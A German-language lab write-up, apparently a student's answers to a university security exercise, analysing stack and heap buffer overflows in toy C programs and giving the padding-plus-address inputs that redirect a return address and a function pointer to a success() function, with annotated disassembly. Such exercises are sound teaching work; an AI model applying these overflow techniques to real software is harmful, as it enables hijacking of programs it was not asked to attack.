# Buffer Overflow Exploits

## 1.1 Finden Sie die Buffer Overflow Schwachstelle. Wo im Programm ist die Schwachstelle? Welchen Input müssen Sie dem Programm schicken, um den Buffer Overflow auszulösen? Wie lang ist der Input?
Die Schwachstelle im Programm ist in Zeile 19ff. in bufovf.c
```c
void vuln(void) {
  char buf[140] = {0};
  puts("exploit me!");
  read(0, buf, sizeof(buf) + 32);
}
```
Hierbei werden 172 Zeichen nach einen 140 Zeichen langen Buffer gelesen. Um über die Grenzen des Buffers hinaus zu schreiben und einen Buffer-Overflow auszulösen, muss man mindestens 141 Zeichen senden.


## 1.2 Überschreiben Sie die Return-Adresse zuerst mit dem Wert 0x41414141 (ASCII „AAAA“) um zu demonstrieren, dass Sie den Instruction Pointer kontrollieren können.
Die Eingabe lautet in Python-String ausgedrückt b"A"*152 + p32(0x41414141) (152-mal A und die little-Endian-Repräsentation vom DWORD 0x41414141).

## 1.3 Überschreiben Sie die Return-Adresse mit der Adresse der Funktion success (diese finden Sie in der Variablen retaddr im Exploit-Template).
Die Eingabe lautet in Python-String ausgedrückt b"A"*152 + p32(0x08049196) (152-mal A und die little-Endian-Repräsentation vom DWORD 0x08049196).

## 2.1 Finden Sie die Buffer Overflow Schwachstelle. Wo im Programm ist die Schwachstelle? Welchen Input müssen Sie dem Programm schicken, um den Buffer Overflow auszulösen? Wie lang ist der Input?
Die Schwachstelle ist in 
```c
char *input_buffer = checked_malloc(96);
```
Es wird ein Buffer von 96 Bytes auf dem Buffer reserviert. Allerdings wird später in

```c
puts("Enter word length:");
r = scanf("%zu", &length);
[...]
puts("Enter a word:");
wr = fgets(buf, length, stdin);
fwrite(buf, length, 1, stdout);
```
dem Nutzer vertraut, eine Länge einzugeben. Danach wird basierend auf der Nutzereingabe die Länge festgelegt, bis zu der der Buffer beschrieben und danach ausgegeben wird. 

Ist die Eingabe länger als 96 Zeichen, wie im ursprünglichen malloc zugewiesen, geschieht ein Buffer Overflow.

## 2.2 Überschreiben Sie den Funktionspointer zuerst mit dem Wert 0x41414141 (ASCII „AAAA“). Vollziehen Sie den Crash im Debugger nach. Wie werden indirekte Funktionsaufrufe über Funktionspointer auf der Assembler Ebene implementiert? Welche Instruktionen bzw. Register sind involviert?
Die Eingaben lauten (in Python ausgedrückt):
word = b"A"*116
length = 117


Kurz vor dem Crash werden die folgenden Instruktionen ausgeführt:
```
0x8049403 <main+38>    call   checked_malloc                     <checked_malloc>
0x8049408 <main+43>    add    esp, 0x10
0x804940b <main+46>    mov    dword ptr [ebp - 0xc], eax ;Die Adresse, wohin der Funktionspointer zeigt, wird in [EBP-0xC] auf den Stack geladen,
0x804940e <main+49>    mov    eax, dword ptr [ebp - 0xc]; Die Adresse, wohin der Funktionspointer zeigt, wird aus dem Stack nach EAX geladen.
0x8049411 <main+52>    mov    dword ptr [eax], fail         <0x8049267>; Die Adresse der fail-Funktion wird an die Adresse geschrieben, die dem aktuellen Wert von EAX entspricht. 
► 0x8049417 <main+58>    sub    esp, 0xc; Ab da kam der Crash, weil der Pointer von fail auf eine ungültige Adresse zeigt.
0x804941a <main+61>    push   dword ptr [ebp - 0x10]
0x804941d <main+64>    call   interact                     <interact>

0x8049422 <main+69>    add    esp, 0x10
0x8049425 <main+72>    mov    eax, dword ptr [ebp - 0xc]; Nachdem interact() fertig ist, wird der auf den Stack abgelegte Wert der Adresse von der fail-Funktion wieder nach EAX geladen
0x8049428 <main+75>    mov    eax, dword ptr [eax]; Der Wert an der Adresse, die in EAX gespeichert war, wird dereferenziert.
(Aus Cutter): 0x804942a call eax; Die Funktion, die dereferenziert wurde, wird aufgerufen
```

Zusammengefasst wird der Funktionspointer auf den Stack geladen, vom Stack in das EAX-Register geladen, dereferenziert und erst dann geschieht der Funktionsaufruf.


## 2.3 Überschreiben Sie den Funktionspointer mit der Adresse der Funktion success. Nutzen Sie dazu die Variable fptraddr im Exploit-Template. Wie ändert sich der Input für das verwundbare Programm?
Der Input (in Python-Strings ausgedrückt), um den Funktions-Pointer auf success() umzuleiten ist:
word = b"A"*112 + p32(0x08049247)
length = 117
Anders als im Input der Aufgabe 2.2 werden die letzten 4 Bytes mit dem DWORD 0x08049247, der Adresse der success-Funktion ersetzt, um den Funktionspointer umzuleiten.